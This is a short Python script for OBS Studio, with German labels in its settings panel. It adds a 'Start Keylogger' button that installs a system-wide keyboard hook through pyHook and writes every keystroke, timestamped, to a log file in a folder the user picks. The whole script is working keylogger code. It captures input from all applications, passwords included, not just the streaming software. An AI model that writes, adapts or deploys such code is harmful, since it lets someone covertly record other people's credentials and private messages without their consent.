import obspython as obs
from datetime import datetime
import pyHook, pythoncom, sys, logging


sourceName = ""


def keylogger_pressed(props, prop):

    while 1:
      """if(obs.obs_frontend_streaming_active() == True):"""
      hooks_manager = pyHook.HookManager()
      hooks_manager.KeyDown = onButtonPress
      hooks_manager.HookKeyboard()
      pythoncom.PumpMessages()


def onButtonPress(event):

    fileName = sourceName + '/myLog.txt'
    file = open(fileName, "a")

    if checkExceptions(event.Ascii) != "False":
      file.write(datetime.now().strftime('%H:%M:%S') + " : " + checkExceptions(event.Ascii) + "\n")

    else:
      file.write(datetime.now().strftime('%H:%M:%S') + " : " + chr(event.Ascii) + "\n")

    file.close()
    return True


def script_properties():

    props = obs.obs_properties_create()

    obs.obs_properties_add_path(props, "filePath", "Pfad für Logfile wählen: ", obs.OBS_PATH_DIRECTORY, '', "")
    obs.obs_properties_add_button(props, "button", "Start Keylogger", keylogger_pressed)
    return props


def script_update(settings):

    global sourceName
    sourceName = obs.obs_data_get_string(settings, "filePath")


def checkExceptions(value):

    exception = {
             0 : key0,
             8 : key8,
             9 : key9,
            13 : key13,
            27 : key27,
            32 : key32,
            44 : key44,
            45 : key45,
            46 : key46,
    }

    returner = exception.get(value, lambda: "False")
    return returner()


def key0():

  return "[SHIFT/STRG/ALT]"


def key8():

  return "[BACKSPACE]"


def key9():

  return "[TAB]"


def key13():

  return "[ENTER]"


def key27():

  return "[ESC]"


def key32():

  return "[SPACE]"


def key44():

  return "[,]"


def key45():

  return "[-]"


def key46():

  return "[.]"
